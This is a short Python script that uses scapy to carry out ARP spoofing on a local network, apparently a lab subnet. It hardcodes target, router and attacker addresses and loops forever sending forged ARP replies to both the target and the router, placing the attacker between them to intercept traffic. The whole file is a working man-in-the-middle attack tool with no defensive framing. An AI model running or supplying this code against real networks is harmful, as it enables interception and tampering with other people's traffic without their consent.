#/usr/bin/env python
# Rebuild
from scapy.layers.l2 import ARP, Ether
import scapy.all as scapy
import time
from utils.arp_spoof_utils import check_port_forwarding

target_interface_1 = "192.168.63.174"
target_interface_2 = "192.168.63.177"
target_mac_1 = "00:0c:29:3a:62:c0"
router_ip = "192.168.63.2"
my_ip = "192.168.63.139"
my_mac = "00-0c-29-fe-37-29"

# get the Target IP MAC Address
def get_mac(ip):
	arp_request = ARP(pdst=ip)
	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
	broadcast_arp_request = broadcast/arp_request
	answered_list = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]
	return answered_list[0][1].hwsrc

check_port_forwarding()

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet)

while True:
	spoof(target_interface_1, router_ip)
	spoof(router_ip, target_interface_1)
	time.sleep(2)